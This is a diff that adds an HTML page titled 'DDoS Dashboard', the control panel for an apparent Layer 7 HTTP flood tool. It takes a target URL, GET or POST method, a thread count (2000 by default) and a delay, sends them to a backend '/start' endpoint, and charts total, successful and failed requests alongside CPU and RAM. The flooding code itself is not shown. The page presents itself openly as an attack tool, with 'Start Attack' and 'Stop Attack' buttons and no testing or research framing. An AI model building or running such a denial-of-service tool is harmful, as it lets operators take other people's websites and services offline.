@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>DDoS Dashboard</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    body {
+      background: #111;
+      color: #fff;
+      font-family: 'Segoe UI', sans-serif;
+      padding: 20px;
+    }
+    h1 {
+      color: #ff5050;
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+    }
+    input, select, button {
+      padding: 8px;
+      margin-top: 5px;
+      width: 200px;
+    }
+    #status {
+      margin-top: 10px;
+      font-weight: bold;
+    }
+    .warn {
+      color: yellow;
+    }
+    .danger {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔥 Live Layer 7 Attack Dashboard</h1>
+
+  <label>Target URL:</label>
+  <input type="text" id="url" value="http://example.com">
+
+  <label>Method:</label>
+  <select id="method">
+    <option>GET</option>
+    <option>POST</option>
+  </select>
+
+  <label>Threads:</label>
+  <input type="number" id="threads" value="2000">
+
+  <label>Delay (s):</label>
+  <input type="text" id="delay" value="0.2">
+
+  <br><br>
+  <button onclick="startAttack()">🚀 Start Attack</button>
+  <button onclick="stopAttack()">🛑 Stop Attack</button>
+
+  <div id="status">Status: <span id="floodStatus">Idle</span></div>
+  <div>CPU: <span id="cpu">0%</span> | RAM: <span id="ram">0%</span></div>
+
+  <canvas id="chart" width="600" height="300"></canvas>
+
+  <script>
+    let chart;
+    const ctx = document.getElementById('chart').getContext('2d');
+    const data = {
+      labels: ["Total", "Success", "Fail"],
+      datasets: [{
+        label: 'Requests',
+        data: [0, 0, 0],
+        backgroundColor: ['blue', 'green', 'red']
+      }]
+    };
+    chart = new Chart(ctx, {
+      type: 'bar',
+      data: data,
+      options: { responsive: false }
+    });
+
+    async function startAttack() {
+      const payload = {
+        url: document.getElementById("url").value,
+        method: document.getElementById("method").value,
+        threads: document.getElementById("threads").value,
+        delay: document.getElementById("delay").value
+      };
+
+      const res = await fetch('/start', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+      });
+
+      document.getElementById("floodStatus").textContent = "Running...";
+    }
+
+    async function stopAttack() {
+      await fetch('/stop', {method: 'POST'});
+      document.getElementById("floodStatus").textContent = "Stopped";
+    }
+
+    async function fetchStats() {
+      const res = await fetch('/stats');
+      const json = await res.json();
+      const { stats, cpu, ram } = json;
+
+      chart.data.datasets[0].data = [stats.total, stats.success, stats.fail];
+      chart.update();
+
+      document.getElementById("floodStatus").textContent = stats.status;
+      document.getElementById("cpu").textContent = cpu + "%";
+      document.getElementById("ram").textContent = ram + "%";
+
+      if (cpu > 80 || ram > 85) {
+        document.getElementById("floodStatus").className = cpu > 95 || ram > 95 ? 'danger' : 'warn';
+      } else {
+        document.getElementById("floodStatus").className = '';
+      }
+    }
+
+    setInterval(fetchStats, 1000);
+  </script>
+</body>
+</html>
